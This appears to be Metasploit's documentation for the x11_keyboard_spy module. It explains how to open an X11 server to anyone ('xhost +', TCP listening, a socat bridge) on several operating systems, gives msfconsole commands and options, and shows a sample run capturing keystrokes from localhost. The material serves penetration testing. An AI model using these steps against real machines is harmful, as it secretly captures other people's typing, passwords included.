## Vulnerable Application

This module binds to an open X11 host to log keystrokes. The X11 service can accept
connections from any users when misconfigured with the command `xhost +`.
This module is a close copy of the old xspy c program which has been on Kali for a long time.
The module works by connecting to the X11 session, creating a background
window, binding a keyboard to it and creating a notification alert when a key
is pressed.

One of the major limitations of xspy, and thus this module, is that it polls
at a very fast rate, faster than a key being pressed is released (especially before
the repeat delay is hit). To combat printing multiple characters for a single key
press, repeat characters arent printed when typed in a very fast manor. This is also
an imperfect keylogger in that keystrokes arent stored and forwarded but status
displayed at poll time. Keys may be repeated or missing.

### Ubuntu 10.04

1. `sudo nano /etc/gdm/gdm.schemas`
2. Find:

    ```
    <schema>
     <key>security/DisallowTCP</key>
     <signature>b</signature>
     <default>true</default>
    </schema>
    ```
  - Change `true` to `false`

3. logout or reboot
4. Verification: ```sudo netstat -antp | grep 6000```

    ```
    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
    ```

5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Ubuntu 12.04, 14.04

1. `sudo nano /etc/lightdm/lightdm.conf`
2. Under the `[SeatDefaults]` area, add:

    ```
    xserver-allow-tcp=true
    allow-guest=true
    ```

3. logout or reboot
4. Verification: ```sudo netstat -antp | grep 6000```

    ```        	
    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
    ```

5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Ubuntu 16.04

  Use the Ubuntu 12.04 instructions, however change `SeatDefaults` to `Seat:*`

### Fedora 15

1. `vi /etc/gdm/custom.conf`
2. Under the `[security]` area, add:

    ```
    DisallowTCP=false
    ```

3. logout/reboot
4. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Solaris 10

1. `svccfg -s svc:/application/x11/x11-server setprop options/tcp_listen = true`
2. `svc disable cde-login`
3. `svc enable cde-login`
4. `xhost +`

### Ubuntu 22.04

#### Server

Getting X11 to listen on a TCP port is rather taxing, so we use socat to facilitate instead.

1. `sudo apt-get install ubuntu-desktop socat` # overkill but it gets everything we need
2. `sudo reboot` # prob a good idea since so much was installed
3. `sudo xhost +` # must be done through gui, not through SSH
4. `socat -d -d TCP-LISTEN:6000,fork,bind=<IP to listen to here> UNIX-CONNECT:/tmp/.X11-unix/X0`, you may need to use `X1` instead of `X0` depending on context.

## Verification Steps

1. Configure X11 to listen on port 6000, or use `socat` to open a socket.
1. Start msfconsole
1. Do: `use auxiliary/gather/x11_keyboard_spy`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should print keystrokes as they're pressed

## Options

### LISTENER_TIMEOUT

How many seconds to keylog for.
If set to `0`, wait forever. Defaults to `600`, 10 minutes.

### PRINTERVAL

The interval to print keylogs in seconds. Defaults to `60`.

## Scenarios

### Ubuntu 22.04

```
[*] Processing xspy.rb for ERB directives.
resource (xspy.rb)> use auxiliary/gather/x11_keyboard_spy
resource (xspy.rb)> set verbose true
verbose => true
resource (xspy.rb)> set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/x11_keyboard_spy) > run
[*] Running module against 127.0.0.1

[*] 127.0.0.1:6000 - Establishing TCP Connection
[*] 127.0.0.1:6000 - [1/9] Establishing X11 connection
[-] 127.0.0.1:6000 - Connection packet malformed (size: 8192), attempting to get read more data
[+] 127.0.0.1:6000 - Successfully established X11 connection
[*] 127.0.0.1:6000 - Version: 11.0
[*] 127.0.0.1:6000 - Screen Resolution: 958x832
[*] 127.0.0.1:6000 - Resource ID: 33554432
[*] 127.0.0.1:6000 - Screen root: 1320
[*] 127.0.0.1:6000 - [2/9] Checking on BIG-REQUESTS extension
[+] 127.0.0.1:6000 -   Extension BIG-REQUESTS is present with id 134
[*] 127.0.0.1:6000 - [3/9] Enabling BIG-REQUESTS
[*] 127.0.0.1:6000 - [4/9] Creating new graphical context
[*] 127.0.0.1:6000 - [5/9] Checking on XKEYBOARD extension
[+] 127.0.0.1:6000 -   Extension XKEYBOARD is present with id 136
[*] 127.0.0.1:6000 - [6/9] Enabling XKEYBOARD
[*] 127.0.0.1:6000 - [7/9] Requesting XKEYBOARD map
[*] 127.0.0.1:6000 - [8/9] Enabling notification on keyboard and map
[*] 127.0.0.1:6000 - [9/9] Creating local keyboard map
[+] 127.0.0.1:6000 - All setup, watching for keystrokes
[+] 127.0.0.1:6000 - X11 Key presses observed: te[space]quuick[space]rown[space]foxmps[space]oveerr[space]the[space]lazy[space]do
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[-] 127.0.0.1:6000 - No key presses observed
[*] 127.0.0.1:6000 - Closing X11 connection
[+] 127.0.0.1:6000 - Logged keys stored to: /root/.msf4/loot/20240226150211_default_127.0.0.1_x11.keylogger_839830.txt
[-] 127.0.0.1:6000 - Stopping running against current target...
[*] 127.0.0.1:6000 - Control-C again to force quit all targets.
[*] Auxiliary module execution completed
```

## Confirming

To keylog the remote host, we use a tool called [xspy](http://tools.kali.org/sniffingspoofing/xspy)

The output will be very similar to the metasploit module, but may differ. Compare the below two entries (spaces added to xspy for alignment):

```
xspy: the      quck         rown       foxumps      over         the       lazy      do
msf:  te[space]quuick[space]rown[space]foxmps[space]oveerr[space]the[space]lazy[space]do
```
